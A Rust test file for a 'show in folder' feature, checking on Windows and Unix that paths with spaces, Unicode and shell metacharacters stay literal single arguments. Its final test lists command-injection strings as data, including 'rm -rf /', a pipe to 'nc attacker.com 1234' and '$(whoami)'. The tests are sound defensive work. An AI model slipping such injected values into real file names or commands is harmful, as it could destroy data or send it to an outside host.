use std::path::PathBuf;

#[cfg(target_os = "windows")]
#[test]
fn test_show_in_folder_windows_osstring_safety() {
    use std::ffi::OsString;

    let test_cases = vec![
        // Normal path
        (
            r"C:\Users\test\document.txt",
            "C:\\Users\\test\\document.txt",
        ),
        // Path with spaces
        (
            r"C:\Program Files\test app\file.txt",
            "C:\\Program Files\\test app\\file.txt",
        ),
        // Unicode characters
        (r"C:\用户\文档\file.txt", "C:\\用户\\文档\\file.txt"),
        // Apostrophe (common in Irish names like O'Brien)
        (
            r"C:\Users\o'brien\docs\file.txt",
            "C:\\Users\\o'brien\\docs\\file.txt",
        ),
        // Quote character
        (
            r#"C:\Users\test"name\file.txt"#,
            r#"C:\Users\test"name\file.txt"#,
        ),
        // Ampersand
        (
            r"C:\Users\test&name\file.txt",
            "C:\\Users\\test&name\\file.txt",
        ),
        // Semicolon
        (
            r"C:\Users\test;name\file.txt",
            "C:\\Users\\test;name\\file.txt",
        ),
        // Pipe character
        (
            r"C:\Users\test|name\file.txt",
            "C:\\Users\\test|name\\file.txt",
        ),
    ];

    for (input_path, expected_display) in test_cases {
        let path = PathBuf::from(input_path);

        let mut select_arg = OsString::from("/select,");
        select_arg.push(&path);

        let as_string = select_arg.to_string_lossy();
        assert!(
            as_string.starts_with("/select,"),
            "Failed for path: {}. OsString: {}",
            input_path,
            as_string
        );
        assert!(
            as_string.contains(input_path) || as_string.contains(expected_display),
            "Failed for path: {}. OsString: {}",
            input_path,
            as_string
        );

        // Most importantly: verify no shell metacharacters can break out of path context
        // The key is that path is added as a single OsString component, not parsed
    }
}

#[cfg(not(target_os = "windows"))]
#[test]
fn test_show_in_folder_unix_arg_safety() {
    use std::ffi::OsStr;

    let test_cases = vec![
        "/home/user/document.txt",
        "/home/user/file with spaces.txt",
        "/home/用户/文档/file.txt",
        "/home/user/o'brien/file.txt",
        r#"/home/user/"quoted"/file.txt"#,
        "/home/user/file&name.txt",
        "/home/user/file;name.txt",
        "/home/user/file|name.txt",
        "/home/user/file`backtick`.txt",
        "/home/user/file$dollar.txt",
    ];

    for input_path in test_cases {
        let path = PathBuf::from(input_path);

        let os_str: &OsStr = path.as_ref();

        // The key safety property: when passed to Command::arg(),
        // OsStr is NOT parsed as shell command - it's a single argument
        assert_eq!(
            os_str.to_string_lossy(),
            input_path,
            "OsStr should preserve exact path: {}",
            input_path
        );
    }
}

#[test]
fn test_no_command_injection_patterns() {
    let injection_attempts = vec![
        "file.txt && malicious.exe",
        "file.txt; rm -rf /",
        "file.txt | nc attacker.com 1234",
        "file.txt`whoami`",
        "file.txt$(whoami)",
        "file.txt & calc.exe",
    ];

    for attempt in injection_attempts {
        let path = PathBuf::from(attempt);

        // Our implementation uses OsString/PathBuf which prevents parsing
        // The entire string is treated as a path, not parsed for shell metacharacters
        let os_string = path.as_os_str().to_string_lossy();

        assert_eq!(
            os_string, attempt,
            "Injection attempt should be preserved as literal path: {}",
            attempt
        );
    }
}
